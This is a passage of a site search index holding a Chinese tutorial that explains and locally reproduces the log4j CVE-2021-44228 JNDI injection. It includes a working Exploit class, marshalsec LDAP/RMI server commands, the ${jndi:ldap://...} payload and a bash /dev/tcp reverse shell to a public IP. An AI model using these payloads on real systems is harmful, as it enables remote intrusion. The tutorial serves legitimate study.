JNDI\u3001LDAP\u3001RMI\u3001log4j \u7b49\u65b9\u9762\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u5177\u4f53\u539f\u7406\uff0c\u518d\u901a\u8fc7 LDAP\u3001RMI \u4e24\u79cd\u65b9\u5f0f\u672c\u5730\u590d\u73b0\u8be5\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u548c\u53cd\u5f39\u7ec8\u7aef\uff0c\u6700\u540e\u4ecb\u7ecd\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u3002","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#log4j_1","text":"","title":"log4j \u6f0f\u6d1e\u6982\u8ff0"},{"location":"cs/web/log4j_vuln/#log4j_2","text":"log4j \u662f Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u6e90 Java \u65e5\u5fd7\u6846\u67b6\u3002\u5b83\u63d0\u4f9b\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0e\u8f93\u51fa\u529f\u80fd\uff0c\u53ef\u4ee5\u8f93\u51fa\u65e5\u5fd7\u5230\u4efb\u610f\u4f4d\u7f6e\u3001\u66f4\u6539\u65e5\u5fd7\u5185\u5bb9\u6837\u5f0f\u3001\u6307\u5b9a\u65e5\u5fd7\u7ea7\u522b\u5e76\u5206\u7ea7\u522b\u663e\u793a\u3001\u4ee5\u53ca\u5229\u7528 ${} \u8bed\u53e5\u8f93\u51fa\u52a8\u6001\u5185\u5bb9\u7b49\u3002 \u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c1.x \u7248\u672c\u7684 log4j \u9010\u6e10\u5728\u7ed3\u6784\u3001\u6027\u80fd\u4e0a\u88ab slf4j\u3001logback \u7b49\u65b0\u5174\u7684\u65e5\u5fd7\u6846\u67b6\u8d85\u8d8a\uff0cApache \u4e5f\u56e0\u6b64\u5bf9 log4j \u8fdb\u884c\u4e86\u4e00\u6b21\u91cd\u6784\u5347\u7ea7\uff0c\u53d1\u5e03\u4e86\u4f18\u5316\u4e86\u7ed3\u6784\u3001\u6027\u80fd\u7684 2.x \u7248\u672c log4j\uff08\u53c8\u540d log4j2\uff09\u3002log4j2 \u501f\u9274\u4e86 slf4j \u7684\u7ed3\u6784\u8bbe\u8ba1\uff0c\u5206\u4e3a\u4e86\u4e24\u90e8\u5206\uff1alog4j-api\u3001log4j-core\uff0c\u524d\u8005\u4ec5\u63d0\u4f9b\u63a5\u53e3\uff0c\u540e\u8005\u63d0\u4f9b\u5b9e\u73b0\u3002\u5305\u540d\u5206\u522b\u4e3a org.apache.logging.log4j \u548c org.apache.logging.log4j.core\u3002 \u56e0\u4e3a log4j \u7684\u6613\u7528\u6027\uff0c\u4f17\u591a\u4ee5 Java \u4f5c\u4e3a\u540e\u7aef\u670d\u52a1\u8bed\u8a00\u7684\u7f51\u7edc\u5e94\u7528\u3001\u8f6f\u4ef6\u90fd\u5728\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u3002","title":"log4j \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#cve-2021-44228","text":"CVE-2021-44228 \u662f\u963f\u91cc\u4e91\u56e2\u961f\u5728 2021 \u5e74 11 \u6708 26 \u65e5\u63d0\u4ea4\u3001\u540c\u5e74 12 \u6708 9 \u65e5\u516c\u5f00\u7684\u5173\u4e8e log4j \u7684\u91cd\u5927\u6f0f\u6d1e\u3002\u5b83\u53ef\u4ee5\u5b9e\u73b0 RCE\uff08Remote Code Execution\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff09\uff0c\u4ece\u800c\u5371\u5bb3\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684 Java \u670d\u52a1\u5668\u7684\u5b89\u5168\u3002CVSS3.0\uff08\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\uff09\u8bc4\u5206 10.0 \u5206\u3001\u8bc4\u7ea7 critical\u3002 \u8be5\u6f0f\u6d1e\u5a01\u80c1\u7b49\u7ea7\u9ad8\u3001\u5f71\u54cd\u9762\u5e7f\u6cdb\u3001\u5229\u7528\u4ef7\u503c\u9ad8\u3001\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u53d7\u5230\u5e7f\u6cdb\u5173\u6ce8\u3002\u5e76\u4e14\u56e0\u4e3a log4j \u7684\u5e7f\u6cdb\u5e94\u7528\uff0c\u5305\u62ec\u82f9\u679c\u3001\u8c37\u6b4c\u3001\u767e\u5ea6\u3001Steam \u7b49\u5728\u5185\u7684\u5927\u578b\u4e92\u8054\u7f51\u4f01\u4e1a\u7684\u4ea7\u54c1\u4e5f\u90fd\u53d7\u5230\u8be5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002 \u8be5\u6f0f\u6d1e\u7531 JNDI \u7279\u6027\u5f15\u8d77\uff0c\u5176\u5e76\u6ca1\u6709\u4fdd\u62a4\u901a\u8fc7 LDAP \u7b49\u67e5\u627e JNDI \u7684\u65b9\u5f0f\uff0c\u9020\u6210\u6f5c\u5728\u7684 RCE\u3002\u5f71\u54cd\u8303\u56f4\u4ece log4j \u7248\u672c 2.0-beta9 \u5f00\u59cb\u5230 2.15.0-rc1\uff0c\u5e76\u5728 2.15.0-rc2 \u7248\u672c\u4e2d\u5c06\u8fd9\u4e00\u884c\u4e3a\u9ed8\u8ba4\u5173\u95ed\uff0c\u5728 2.16.0 \u7248\u672c\u4e2d\u5b8c\u5168\u79fb\u9664\u3002","title":"CVE-2021-44228"},{"location":"cs/web/log4j_vuln/#log4j_3","text":"","title":"log4j \u6f0f\u6d1e\u539f\u7406"},{"location":"cs/web/log4j_vuln/#jndi","text":"JNDI\uff08Java Naming and Directory Interface\uff0cJava \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\u662f\u7528\u4e8e\u4ece Java \u5e94\u7528\u4e2d\u8bbf\u95ee\u540d\u79f0\u548c\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u7ec4 API\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5c06\u540d\u79f0/\u76ee\u5f55\u4e0e\u5bf9\u8c61\u76f8\u5173\u8054\uff0c\u5e76\u63d0\u4f9b\u4e86\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u6765\u67e5\u627e\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 JNDI \u67b6\u6784\u5206\u4e3a\u4e09\u5c42\uff1a JNDI API\uff1a\u4e0e Java \u5e94\u7528\u7a0b\u5e8f\u901a\u4fe1\uff0c\u63d0\u4f9b\u7f16\u7a0b\u63a5\u53e3\uff0c\u9694\u79bb\u5e94\u7528\u4e0e\u6570\u636e\u6e90 Naming Manager\uff1a\u547d\u540d\u670d\u52a1\u7ba1\u7406\u5668 JNDI SPI\uff1a\u4e0e\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\uff08\u670d\u52a1\uff09\u76f8\u8fde\u63a5 JNDI \u652f\u6301\u7684\u670d\u52a1\u6709\u5f88\u591a\uff0c\u6bd4\u5982 RMI\u3001LDAP\u3001DNS \u7b49\u670d\u52a1\u3002JNDI \u5c01\u88c5\u4e86\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f7f\u5f97\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u4ee3\u7801\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\uff08\u8c03\u7528\u5bb9\u5668\u73af\u5883\u7684 Context \u7684 lookup \u65b9\u6cd5\uff09","title":"JNDI \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#rmi","text":"RMI\uff08Remote Method Invocation\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\u670d\u52a1\u63d0\u4f9b\u4e86\u4ece\u4e00\u4e2a JVM \u4e2d\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2a JVM \u5bf9\u8c61\u65b9\u6cd5\u7684\u65b9\u5f0f\u3002\u4e5f\u662f RPC\uff08Remote Procedure Calls\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u9762\u5411\u5bf9\u8c61\u7b49\u4ef7\u670d\u52a1\u3002\u5b83\u9700\u8981\u4e00\u4e2a Server \u7aef\u63d0\u4f9b RMI \u670d\u52a1\u548c\u4e00\u4e2a Client \u7aef\u8bbf\u95ee\u8fdc\u7a0b\u63d0\u4f9b\u7684 RMI \u670d\u52a1\u3002RMI \u670d\u52a1\u5206\u4e3a\u4e09\u5c42\uff1a \u5b58\u6839\u4e0e\u9aa8\u67b6 \u5b58\u6839\uff08Stub\uff09\uff1a\u4e0e Client \u7aef\u76f8\u8fde\uff0c\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u4ee3\u7406 \u9aa8\u67b6\uff08Skeleton\uff09\uff1a\u4e0e Server \u7aef\u76f8\u8fde\uff0c\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5 \u8fdc\u7a0b\u5f15\u7528\u5c42\uff08Remote Reference Layer\uff09\uff1a\u7528\u6765\u5bfb\u627e\u901a\u4fe1\u5bf9\u8c61\u4ee5\u53ca\u901a\u8fc7 RMI Registry \u63d0\u4f9b\u547d\u540d\u670d\u52a1 \u4f20\u8f93\u5c42\uff08Transport Layer\uff09\uff1a\u5728 Server \u4e0e Client \u7aef\u5efa\u7acb socket \u901a\u4fe1 Server \u7aef\u5f00\u542f RMI \u670d\u52a1\u65f6\u5148\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5411 registry \u6ce8\u518c\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7b49\u5f85\u8c03\u7528\u3002Client \u7aef\u8fdb\u884c RMI \u65f6\u8bbf\u95ee registry \u5f97\u5230\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\uff0c\u518d\u901a\u8fc7\u5b58\u6839\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u5b58\u6839\u5e8f\u5217\u5316\u8c03\u7528\u540e\u4e0e\u9aa8\u67b6\u901a\u4fe1\u4f7f\u9aa8\u67b6\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5b58\u6839\u518d\u53cd\u5e8f\u5217\u5316\u4ea4\u7ed9\u5ba2\u6237\u7aef\u3002","title":"RMI \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#ldap","text":"LDAP\uff08Lightweight Directory Access Protocol\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7 TCP/IP \u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 LDAP \u534f\u8bae\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u6811\u5f62\u7684\u6570\u636e\u5e93\u3002","title":"LDAP \u7b80\u4ecb"},{"location":"cs/web/log4j_vuln/#jndi_1","text":"\u5982\u524d\u9762\u6240\u8bf4\uff0cJNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002 JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit \u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002 \u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09","title":"JNDI \u6ce8\u5165\u539f\u7406"},{"location":"cs/web/log4j_vuln/#cve-2021-44228_1","text":"CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002 \u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002","title":"CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406"},{"location":"cs/web/log4j_vuln/#log4j_4","text":"\u4e0b\u9762\u5206\u522b\u901a\u8fc7\u8c03\u7528 LDAP \u548c RMI \u670d\u52a1\u7684\u65b9\u5f0f\u6765\u590d\u73b0\u8fd9\u4e00 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#ldap_1","text":"\u8fdb\u884c\u8fd9\u4e00\u6f0f\u6d1e\u7684\u590d\u73b0\u9700\u8981\u4ee5\u4e0b\u4e24\u4e2a\u90e8\u5206\uff1a \u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u7528\u6765\u91cd\u5b9a\u5411\u63d0\u4f9b\u653b\u51fb\u7c7b \u9700\u8981\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\u6765\u4e3a\u5176\u63d0\u4f9b\u653b\u51fb\u7c7b \u4e00\u4e2a\u5305\u542b\u5b58\u5728\u6f0f\u6d1e\u7684 log4j \u7ec4\u4ef6\u7684 Java \u5e94\u7528","title":"LDAP \u5b9e\u73b0"},{"location":"cs/web/log4j_vuln/#_1","text":"\u9996\u5148\u662f\u7528\u4e8e\u53d1\u8d77\u653b\u51fb\u7684 Exploit \u7c7b\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a public class Exploit { static { try { String [] cmds = { \"open\" , \"/System/Applications/Calculator.app\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); } catch ( Exception e ) { e . printStackTrace (); } } } \u4f7f\u7528 javac Exploit.java \u5c06\u8fd9\u4e2a\u7c7b\u7f16\u8bd1\u4e3a .class \u7c7b\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 python -m http.server 8888 \u4e3a\u5f53\u524d\u76ee\u5f55\u5728 8888 \u7aef\u53e3\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u3002\u53ef\u4ee5\u901a\u8fc7 curl -I 127.0.0.1:8888/Exploit.class \u6765\u68c0\u67e5\u662f\u5426\u6b63\u5e38\u90e8\u7f72\uff0c\u80fd\u5426\u83b7\u53d6\u5230\u5f53\u524d Exploit \u7c7b\u6587\u4ef6\u3002","title":"\u653b\u51fb\u7c7b"},{"location":"cs/web/log4j_vuln/#ldap_2","text":"\u4f7f\u7528 marshalsec \u63d0\u4f9b\u7684\u5de5\u5177\u6765\u76f4\u63a5\u642d\u5efa LDAP \u670d\u52a1 git clone https://github.com/mbechler/marshalsec.git cd marshalsec mvn clean package -DskipTests # \u901a\u8fc7 maven \u6784\u5efa java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8888/#Exploit\" \u8fd9\u4e2a LDAP \u670d\u52a1\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9 8888 \u7aef\u53e3\u4e2d\u7684 Exploit \u7c7b\u6587\u4ef6\u7684\u91cd\u5b9a\u5411\u8bbf\u95ee\uff0c\u7aef\u53e3\u5728\u9ed8\u8ba4\u7684 1389\u3002","title":"LDAP \u670d\u52a1"},{"location":"cs/web/log4j_vuln/#log4j_5","text":"\u7f16\u5199\u4e00\u4e2a\u53ea\u8c03\u7528\u4e86 log4j \u8bb0\u5f55 ${jndi:ldap://127.0.0.1:1389/Exploit} \u7684\u7c7b\uff08\u8fd9\u4e2a payload \u4e00\u822c\u662f\u7531\u7528\u6237\u8f93\u5165\u83b7\u53d6\u7684\uff0c\u4f46\u8fd9\u91cc\u65b9\u4fbf\u590d\u73b0\u76f4\u63a5\u786c\u7f16\u7801\u5230\u6f0f\u6d1e\u5e94\u7528\u4e2d\u4e86\uff0c\u4e8c\u8005\u672c\u8d28\u662f\u4e00\u6837\u7684\uff09\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:ldap://127.0.0.1:1389/Exploit}\" ); } } \u6ce8\u610f\u56e0\u4e3a\u662f\u9ad8\u7248\u672c JDK\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5f00\u542f com.sun.jndi.ldap.object.trustURLCodebase \u9009\u9879\u3002","title":"log4j \u6f0f\u6d1e\u5e94\u7528"},{"location":"cs/web/log4j_vuln/#_2","text":"\u524d\u9762\u5df2\u7ecf\u6b63\u5e38\u5f00\u542f\u4e86 LDAP \u670d\u52a1\uff0c\u6240\u4ee5\u6f0f\u6d1e\u5e94\u7528\u8fd0\u884c\u65f6\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230 Exploit \u7c7b\uff0c\u6267\u884c\u5176\u4e2d\u9759\u6001\u4ee3\u7801\u3002\u56e0\u4e3a\u5176\u4e2d\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\u5e94\u7528\u3002 \u53ef\u4ee5\u770b\u5230 LDAP \u670d\u52a1\u7aef\u8f93\u51fa\u4e86\u4e00\u6761\u53d1\u9001 LDAP \u5f15\u7528\u7684\u8bed\u53e5\uff0c\u8bf4\u660e log4j \u5e94\u7528\u786e\u5b9e\u8fde\u63a5\u4e86 LDAP \u670d\u52a1\u7aef\u5e76\u83b7\u53d6\u4e86 Exploit.class \u7c7b\u6587\u4ef6\u3002\u800c\u4e14\u56e0\u4e3a\u5176\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u770b\u5230\u5f39\u51fa\u4e86\u8ba1\u7b97\u5668\uff0c\u8bf4\u660e\u4e86\u8fd9\u4e2a\u9759\u6001\u4ee3\u7801\u786e\u5b9e\u88ab\u6267\u884c\u4e86\u3002\u8fd9\u4e5f\u5c31\u590d\u73b0\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u63a5\u4e0b\u6765\u66f4\u6362\u4e00\u4e0b exec \u6267\u884c\u7684\u547d\u4ee4\uff0c\u6765\u5b9e\u73b0\u53cd\u5f39\u7ec8\u7aef\u3002 \u9996\u5148\u5728\u8fdc\u7a0b\u516c\u7f51\u670d\u52a1\u5668\uff08ip \u662f 47.103.43.32\uff09\u901a\u8fc7 nc -lnvvp 7777 \u5728 7777 \u7aef\u53e3\u76d1\u542c\uff0c\u7528\u6765\u6355\u83b7\u53cd\u5f39\u7684\u7ec8\u7aef\u3002\u7136\u540e\u66f4\u6539\u653b\u51fb\u7c7b\u4ee3\u7801\uff1a String [] cmds = { \"/bin/bash\" , \"-c\" , \"bash -i >& /dev/tcp/47.103.43.32/7777 0>&1\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); \u5373\u901a\u8fc7 /dev/tcp \u8bbe\u5907\u5c06 bash \u7684\u8f93\u5165\u8f93\u51fa\u6d41\u91cd\u5b9a\u5411\u5230\u516c\u7f51\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0 get shell\u3002\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\uff1a \u7531\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u8fde\u63a5\u4e0a\u4e86\u5f53\u524d\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u7684 macOS \u4e3b\u673a\u3002","title":"\u590d\u73b0\u653b\u51fb"},{"location":"cs/web/log4j_vuln/#_3","text":"\u901a\u8fc7\u8c03\u8bd5\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u53ef\u4ee5\u83b7\u53d6\u5230\u6574\u4e2a\u7a0b\u5e8f\u7684\u8c03\u7528\u6808\uff1a < clinit > : 11 , Exploit forName0 : - 1 , Class ( java . lang ) forName : 348 , Class ( java . lang ) loadClass : 91 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 101 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 115 , VersionHelper12 ( com . sun . naming . internal ) getObjectFactoryFromReference : 163 , NamingManager ( javax . naming . spi ) getObjectInstance : 189 , DirectoryManager ( javax . naming . spi ) c_lookup : 1114 , LdapCtx ( com . sun . jndi . ldap ) p_lookup : 542 , ComponentContext ( com . sun . jndi . toolkit . ctx ) lookup : 177 , PartialCompositeContext ( com . sun . jndi . toolkit . ctx ) lookup : 205 , GenericURLContext ( com . sun . jndi . toolkit . url ) lookup : 94 , ldapURLContext ( com . sun . jndi . url . ldap ) lookup : 417 , InitialContext ( javax . naming ) lookup : 172 , JndiManager ( org . apache . logging . log4j . core . net ) lookup : 56 , JndiLookup ( org . apache . logging . log4j . core . lookup ) lookup : 221 , Interpolator ( org . apache . logging . log4j . core . lookup ) resolveVariable : 1110 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 1033 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 912 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) replace : 467 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) format : 132 , MessagePatternConverter ( org . apache . logging . log4j . core . pattern ) format : 38 , PatternFormatter ( org . apache . logging . log4j . core . pattern ) toSerializable : 344 , PatternLayout$PatternSerializer ( org . apache . logging . log4j . core . layout ) toText : 244 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 229 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 59 , PatternLayout ( org . apache . logging . log4j . core . layout ) directEncodeEvent : 197 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryAppend : 190 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) append : 181 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryCallAppender : 156 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender0 : 129 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenderPreventRecursion : 120 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender : 84 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenders : 540 , LoggerConfig ( org . apache . logging . log4j . core . config ) processLogEvent : 498 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 481 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 456 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 63 , DefaultReliabilityStrategy ( org . apache . logging . log4j . core . config ) log : 161 , Logger ( org . apache . logging . log4j . core ) tryLogMessage : 2205 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageTrackRecursion : 2159 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageSafely : 2142 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessage : 2017 , AbstractLogger ( org . apache . logging . log4j . spi ) logIfEnabled : 1983 , AbstractLogger ( org . apache . logging . log4j . spi ) error : 740 , AbstractLogger ( org . apache . logging . log4j . spi ) main : 11 , log4j \u53ef\u4ee5\u8f83\u6e05\u6670\u5730\u5206\u6790\u51fa\u6765\u7a0b\u5e8f\u8fdb\u5165\u6267\u884c logger.error\uff0c\u7136\u540e\u5728 log \u4e2d\u9010\u5c42\u8c03\u7528\u6700\u7ec8\u8c03\u7528\u5230 resolveVariable \u5373\u5904\u7406 ${} \u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u5230\u4e86 Interpolator \u7684 lookup \u65b9\u6cd5\uff0c\u5176\u4e2d\u5bfb\u627e\u5230\u4e86 JndiLookup \u7c7b\uff0c\u8c03\u7528\u5176 lookup \u65b9\u6cd5\uff0c\u4ece LDAP \u670d\u52a1\u83b7\u53d6\u7c7b\uff0c\u7136\u540e\u4ece\u4e2d getObjectInstance\uff0c\u8fd9\u91cc\u4f1a\u8fdb\u884c loadClass \u64cd\u4f5c\uff0c\u800c\u5176\u4e2d\u8c03\u7528\u4e86 Exploit \u7c7b\u9690\u85cf\u7684 clinit \u65b9\u6cd5\u4e5f\u5c31\u662f\u9759\u6001\u4ee3\u7801\uff0c\u9020\u6210 RCE\u3002","title":"\u8c03\u7528\u6808\u5206\u6790"},{"location":"cs/web/log4j_vuln/#rmi_1","text":"RMI \u7684\u5b9e\u73b0\u7c7b\u4f3c LDAP\uff0cExploit \u7c7b\u540c\u6837\u4f7f\u7528\u8c03\u7528\u8ba1\u7b97\u5668\u7684\u4ee3\u7801\uff0c\u901a\u8fc7 python \u5f00\u542f HTTP \u670d\u52a1\u63d0\u4f9b\u7ed9 RMI\u3002\u7136\u540e\u540c\u6837\u901a\u8fc7 marshalsec \u6765\u642d\u5efa RMI \u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3\u5728 1099\uff09\uff1a java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.RMIRefServer \"http://127.0.0.1:8888/#Exploit\" \u7565\u4fee\u6539\u4e00\u4e0b log4j \u6f0f\u6d1e\u5e94\u7528\uff0c\u4f7f\u4e4b\u8bb0\u5f55 ${jndi:rmi://127.0.0.1:1099/Exploit}\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] 